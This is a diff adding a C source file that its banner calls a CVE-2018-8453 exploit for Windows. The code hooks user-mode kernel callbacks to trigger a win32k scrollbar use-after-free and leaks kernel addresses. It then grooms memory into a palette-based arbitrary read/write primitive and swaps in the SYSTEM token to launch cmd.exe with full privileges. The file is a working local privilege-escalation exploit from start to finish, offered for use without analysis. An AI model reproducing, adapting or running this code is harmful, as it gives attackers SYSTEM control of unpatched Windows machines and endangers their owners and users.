@@ -1,0 +1,416 @@
+#include "stdafx.h"
+#include <Windows.h>
+#include <stdio.h>
+#include <Psapi.h>
+#include <intrin.h>  
+#pragma comment(lib, "Psapi.lib")
+
+BOOL			bMSGSENT = FALSE;
+HWND			hMainWND;
+HWND			hSBWND;
+HWND			hSBWNDnew;
+HWND			hReuseWND;
+
+HPALETTE		hManager;
+HPALETTE		hWorker;
+ULONG64			MgrAddr, WrkAddr;
+ULONG64			CurrentTagCLSAddr;
+
+CHAR			SBTrackBUF[0x80];
+TCHAR			MenuName[0xff0];
+HDC				hDC_Writer[3000];
+ACCEL			acckey[0x0D] = { 0 };
+HACCEL			hAccels[1000];
+HACCEL			hAccel;
+
+typedef void*(NTAPI *lHMValidateHandle)(HWND h, int type);
+lHMValidateHandle pHmValidateHandle = NULL;
+
+typedef unsigned __int64 QWORD, *PQWORD;
+typedef QWORD DT;
+
+typedef struct _HEAD
+{
+	HANDLE h;
+	DWORD  cLockObj;
+} HEAD, *PHEAD;
+
+typedef struct _THROBJHEAD
+{
+	HEAD h;
+	PVOID pti;
+} THROBJHEAD, *PTHROBJHEAD;
+
+typedef struct _THRDESKHEAD
+{
+	THROBJHEAD	h;
+	PULONG64	rpdesk;
+	ULONG64     pSelf;   // points to the kernel mode address
+} THRDESKHEAD, *PTHRDESKHEAD;
+
+typedef struct
+{
+	QWORD UniqueProcessIdOffset;
+	QWORD TokenOffset;
+} VersionSpecificConfig;
+
+VersionSpecificConfig gConfig = { 0x2e0, 0x358 };
+
+EXTERN_C PULONG64 GetKernelCallbackTableBase();
+EXTERN_C VOID FuncInt3();
+EXTERN_C VOID SetWindowFNID(HWND hWnd, LONG64 FNID);
+EXTERN_C VOID SetLinkedUFIs(HDC hDC,PULONG64 addr, LONG64 length);
+
+typedef  ULONG64(WINAPI *fct_fnDispatch64)(PULONG64);
+fct_fnDispatch64 fnDWORD, fnClientFreeWindowClassExtraBytes;
+
+BOOL FindHMValidateHandle() {
+	HMODULE hUser32 = LoadLibraryA("user32.dll");
+	if (hUser32 == NULL) {
+		printf("Failed to load user32");
+		return FALSE;
+	}
+
+	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
+	if (pIsMenu == NULL) {
+		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
+		return FALSE;
+	}
+	unsigned int uiHMValidateHandleOffset = 0;
+	for (unsigned int i = 0; i < 0x1000; i++) {
+		BYTE* test = pIsMenu + i;
+		if (*test == 0xE8) {
+			uiHMValidateHandleOffset = i + 1;
+			break;
+		}
+	}
+	if (uiHMValidateHandleOffset == 0) {
+		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
+		return FALSE;
+	}
+
+	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
+	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
+	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
+
+	return TRUE;
+}
+
+HPALETTE CreatePaletteOfSize(int size, DWORD value) {
+	int pal_cnt = (size - 0x90) / 4;
+	int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY);
+	LOGPALETTE *lPalette = (LOGPALETTE*)malloc(palsize);
+	memset(lPalette, value, palsize);
+	lPalette->palNumEntries = pal_cnt;
+	lPalette->palVersion = 0x300;
+	return CreatePalette(lPalette);
+}
+
+ULONG64 alloccate_free_window()
+{
+	HMODULE hInst = GetModuleHandleA(0);
+	TCHAR strclassname[32] = { 0x41 };
+	WNDCLASSEX wnd = { 0x0 };
+	wnd.cbSize = sizeof(wnd);
+	wnd.lpszClassName = strclassname;
+	wnd.lpfnWndProc = DefWindowProc;
+	wnd.hInstance = hInst;
+	wnd.lpszMenuName = MenuName;
+	RegisterClassExW(&wnd);
+
+	HWND hTmpWnd = CreateWindowEx(
+		0,
+		wnd.lpszClassName,
+		TEXT("WORDS"),
+		0xcf0000,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
+		NULL, NULL, hInst, NULL);
+	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hTmpWnd, 1);
+	ULONG64 p = (ULONG64)tagWND;
+	ULONG64 kernellpSelp = tagWND->pSelf;
+	ULONG64 ulClientDelta = kernellpSelp - p;
+	ULONG64 kernelTagCLS = *(ULONG64*)(p + 0xa8);
+	ULONG64 userTagCLS = kernelTagCLS - ulClientDelta;
+	ULONG64 tagCLS_lpszMenuName = (ULONG64)(*((ULONG64*)(userTagCLS + 0x98)));
+	DestroyWindow(hTmpWnd);
+	UnregisterClass(strclassname, hInst);
+	return tagCLS_lpszMenuName;
+}
+
+ULONG64 GetMangerPalette()
+{
+	ULONG64 Previous, Current;
+	Previous = alloccate_free_window();
+	while (TRUE)
+	{
+		Current = alloccate_free_window();
+		if ((Current == Previous) && (Current != 0))
+		{
+			hManager = CreatePaletteOfSize(0xfe8,0x88);
+			return Current;
+		}
+		Previous = Current;
+	}
+}
+
+ULONG64 GetWorkerPalette()
+{
+	ULONG64 Previous, Current;
+	Previous = alloccate_free_window();
+	while (TRUE)
+	{
+		Current = alloccate_free_window();
+		if (Current == Previous && Current != 0)
+		{
+			hWorker = CreatePaletteOfSize(0xfe8, 0x88);
+			return Current;
+		}
+		Previous = Current;
+	}
+}
+
+VOID GetMangerAndWorker()
+{
+	MgrAddr = GetMangerPalette();
+	WrkAddr = GetWorkerPalette();
+	printf("[*] Manager: 0x%p\n[*] Worker:  0x%p\n", MgrAddr, WrkAddr);
+	memset(SBTrackBUF, 0x44, 0x80);
+	*(PULONG64)(SBTrackBUF + sizeof(ULONG64)) = 0;
+	*(PULONG64)(SBTrackBUF + sizeof(ULONG64) + sizeof(ULONG64)) = MgrAddr + 0x79 - 8 ;
+	//*(PULONG64)(SBTrackBUF + sizeof(ULONG64)) = MgrAddr + 0x16;
+	//*(PULONG64)(SBTrackBUF + sizeof(ULONG64) + sizeof(ULONG64)) = MgrAddr + 0x16;
+}
+
+VOID ReadMem(ULONG64 Addr, DWORD len,PULONG64 ret) {
+	ULONG64 tmp = Addr;
+	SetPaletteEntries(hManager, 0, 2, (LPPALETTEENTRY)&tmp);
+	GetPaletteEntries(hWorker, 0, len, (LPPALETTEENTRY)ret); 
+}
+
+ULONG64 GetNTOsBase()
+{
+	ULONG64 Bases[0x1000];
+	DWORD	needed = 0;
+	ULONG64 krnlbase = 0;
+	if (EnumDeviceDrivers((LPVOID *)&Bases, sizeof(Bases), &needed)) {
+		krnlbase = Bases[0];
+	}
+	return krnlbase;
+}
+
+ULONG64 PsInitialSystemProcess()
+{
+	ULONG64 Module = (ULONG64)LoadLibraryA("ntoskrnl.exe");
+	ULONG64 Addr = (ULONG64)GetProcAddress((HMODULE)Module, "PsInitialSystemProcess");
+	FreeLibrary((HMODULE)Module);
+	ULONG64 res = 0;
+	ULONG64 ntOsBase = GetNTOsBase();
+	if (ntOsBase) {
+		ReadMem(Addr - Module + ntOsBase, 2 ,&res);
+	}
+	return res;
+}
+
+ULONG64 PsGetCurrentProcess(QWORD sysEPS)
+{
+	ULONG64		pEPROCESS = sysEPS;
+	ULONG64		Flink = 0;
+	ULONG64		PID = 0;
+	ReadMem(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), 2, &Flink);
+	while (TRUE) {
+		pEPROCESS = Flink - gConfig.UniqueProcessIdOffset - sizeof(ULONG64);
+		ReadMem(pEPROCESS + gConfig.UniqueProcessIdOffset, 2,&PID);
+		if (GetCurrentProcessId() == PID) {
+			return pEPROCESS;
+		}
+		ReadMem(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), 2, &Flink);
+	}
+}
+
+ULONG64 AllocSBTrackMem() {
+
+	TCHAR  strMenuName[98];
+	memset(strMenuName, 0x55, 98);
+	
+	TCHAR strclassname[0x32] = { 0x11 };
+	HMODULE hInst = GetModuleHandleA(0);
+	WNDCLASSEX wnd = { 0x0 };
+	wnd.cbSize = sizeof(wnd);
+	wnd.lpszClassName = strclassname;
+	wnd.lpfnWndProc = DefWindowProc;
+	wnd.hInstance = hInst;
+	wnd.lpszMenuName = strMenuName;
+	RegisterClassExW(&wnd);
+
+	hReuseWND = CreateWindowEx(
+		0,
+		wnd.lpszClassName,
+		TEXT("WORDS"),
+		0xcf0000,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
+		NULL, NULL, hInst, NULL);
+	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hReuseWND, 1);
+	ULONG64 p = (ULONG64)tagWND;
+	ULONG64 kernellpSelp = tagWND->pSelf;
+	ULONG64 ulClientDelta = kernellpSelp - p;
+	ULONG64 kernelTagCLS = *(ULONG64*)(p + 0xa8);
+	CurrentTagCLSAddr = kernelTagCLS;
+	ULONG64 userTagCLS = kernelTagCLS - ulClientDelta;
+	ULONG64 tagCLS_lpszMenuName = (ULONG64)(*((ULONG64*)(userTagCLS + 0x98)));
+	printf("[*] MenuName: 0x%p\n", tagCLS_lpszMenuName);
+	return tagCLS_lpszMenuName;
+}
+
+VOID SetupManger()
+{
+	QWORD buf[20];
+	ZeroMemory(buf, 20 * sizeof(QWORD));
+	GetPaletteEntries(hManager, 30, 40, (LPPALETTEENTRY)buf);
+	buf[15] = WrkAddr + 0x78;
+	SetPaletteEntries(hManager, 30, 40, (LPPALETTEENTRY)buf);
+}
+
+void GetSystem()
+{
+	ULONG64		SelfToken = 0;
+	ULONG64		SystemToken = 0;
+	ULONG64		SystemEPS;
+	ULONG64		CurrentEPS;
+
+	STARTUPINFO stStartUpInfo = { sizeof(stStartUpInfo) };
+	PROCESS_INFORMATION pProcessInfo;
+	WCHAR	cmd[] = L"c:\\\\windows\\\\system32\\\\cmd.exe";
+
+	SystemEPS = PsInitialSystemProcess();
+	CurrentEPS = PsGetCurrentProcess(SystemEPS);
+
+	ReadMem(SystemEPS + gConfig.TokenOffset, 2, &SystemToken);
+	ReadMem(CurrentEPS + gConfig.TokenOffset, 2, &SelfToken);
+
+	SetPaletteEntries(hManager, 0, 2, (LPPALETTEENTRY)(CurrentEPS + gConfig.TokenOffset));
+	SetPaletteEntries(hWorker, 0, 2, (LPPALETTEENTRY)&SystemToken);
+
+	Sleep(500);
+	printf("[*] Swaping shell.\n\n");
+	ZeroMemory(&stStartUpInfo, sizeof(STARTUPINFO));
+	stStartUpInfo.cb = sizeof(STARTUPINFO);
+	stStartUpInfo.dwFlags = STARTF_USESHOWWINDOW;
+	stStartUpInfo.wShowWindow = 1;
+	CreateProcess(cmd, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &stStartUpInfo, &pProcessInfo);
+	Sleep(500);
+
+	SetPaletteEntries(hWorker, 0, 2, (LPPALETTEENTRY)&SelfToken);
+
+}
+
+void fnDWORDCallBack(PULONG64 msg) 
+{
+	if (bMSGSENT && *msg) {
+		bMSGSENT = FALSE;
+		DestroyWindow(hMainWND);
+	}
+
+	if (*msg && (*(msg + 1) == 0x70) && (*((PULONG64)(*msg)) == (ULONG64)hMainWND)) {
+		SendMessage(hSBWNDnew, WM_CANCELMODE, 0, 0);
+		DestroyAcceleratorTable(hAccel);
+		for (int i = 1001; i < 3000; i++) {
+			SetLinkedUFIs(hDC_Writer[i], (PULONG64)SBTrackBUF, 0xD);
+		}
+	}
+	fnDWORD(msg);
+}
+
+void fnClientFreeWindowClassExtraBytesCallBack(PULONG64 msg) 
+{
+	if (*(PULONG64)*((PULONG64)*(msg - 11)) == (ULONG64)hMainWND) {
+		hSBWNDnew = CreateWindowEx(0, L"ScrollBar", L"SB", SWP_HIDEWINDOW | SB_HORZ, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
+		printf("[*] Set Window FNID.\n");
+		SetWindowFNID(hMainWND, 0x2A1);
+		SetCapture(hSBWNDnew);
+	}
+	fnClientFreeWindowClassExtraBytes(msg);
+}
+
+int main()
+{
+	printf("////////////////////////////////////////////////////////\n");
+	printf("//                                                    //\n");
+	printf("//             CVE-2018-8453 EXPLOIT                  //\n");
+	printf("//                                  Date  : 2019/1/15 //\n");
+	printf("//                                  Author: ze0r      //\n");
+	printf("////////////////////////////////////////////////////////\n\n");
+
+	DWORD		OldProtect = 0;
+	PULONG64	CallbackTb = GetKernelCallbackTableBase();
+
+	VirtualProtect(CallbackTb, 512, PAGE_READWRITE, &OldProtect);
+	CallbackTb += 2;
+	fnDWORD = (fct_fnDispatch64)*CallbackTb;
+	*CallbackTb = (ULONG64)fnDWORDCallBack;
+
+	CallbackTb += 124;
+	fnClientFreeWindowClassExtraBytes = (fct_fnDispatch64)*CallbackTb;
+	*CallbackTb = (ULONG64)fnClientFreeWindowClassExtraBytesCallBack;
+	VirtualProtect(CallbackTb, 512, OldProtect, &OldProtect);
+
+	FindHMValidateHandle();
+	memset(MenuName, 0x41, 0xfe0);
+	MenuName[0xfe0] = 0;
+
+	WNDCLASSEXW wndClass = { 0 };
+	wndClass = { 0 };
+	wndClass.cbSize = sizeof(WNDCLASSEXW);
+	wndClass.lpfnWndProc = DefWindowProc;
+	wndClass.cbClsExtra = 0;
+	wndClass.cbWndExtra = 1;
+	wndClass.hInstance = GetModuleHandleA(NULL);
+	wndClass.lpszMenuName = NULL;
+	wndClass.lpszClassName = L"WNDCLASSMAIN";
+
+	RegisterClassExW(&wndClass);
+	printf("[*] CreateWindow.\n");
+	hMainWND = CreateWindowW(L"WNDCLASSMAIN", L"CVE", WS_DISABLED, 0, 0, 0, 0, nullptr, nullptr, GetModuleHandleA(NULL), nullptr);
+	hSBWND = CreateWindowEx(0, L"ScrollBar", L"SB", WS_CHILD | WS_VISIBLE | SBS_HORZ, 0, 0, 3, 3, hMainWND, NULL, GetModuleHandleA(NULL), NULL);
+
+	printf("[*] Deploy Memory.\n");
+	for (int i = 0; i < 3000; i++) {
+		hDC_Writer[i] = CreateCompatibleDC(NULL);
+	}
+	hAccel = CreateAcceleratorTableA(acckey, 12);
+	GetMangerAndWorker();
+	printf("[*] SendMessage.\n");
+	bMSGSENT = TRUE;
+	SendMessage(hSBWND, WM_LBUTTONDOWN, 0, 0x00020002);
+
+	ULONG64 pHDCLinkData = AllocSBTrackMem();
+
+	SetupManger();
+	GetSystem();
+
+	QWORD buf[14];
+	ULONG64 zero = 0;
+	ZeroMemory(buf, 14 * sizeof(ULONG64));
+	ReadMem(pHDCLinkData, 28, buf);
+	if (buf[12] == 0x4444444400005555) {
+		CurrentTagCLSAddr += 0x98;
+		SetPaletteEntries(hManager, 0, 2, (LPPALETTEENTRY)&CurrentTagCLSAddr);
+		SetPaletteEntries(hWorker, 0, 2, (LPPALETTEENTRY)&zero);
+
+		DestroyWindow(hReuseWND);
+		for (int i = 0; i < 3000; i++) {
+			DeleteObject(hDC_Writer);
+		}
+	}
+	else {
+		Sleep(3600 * 1000);
+	}
+
+	return TRUE;
+}
+
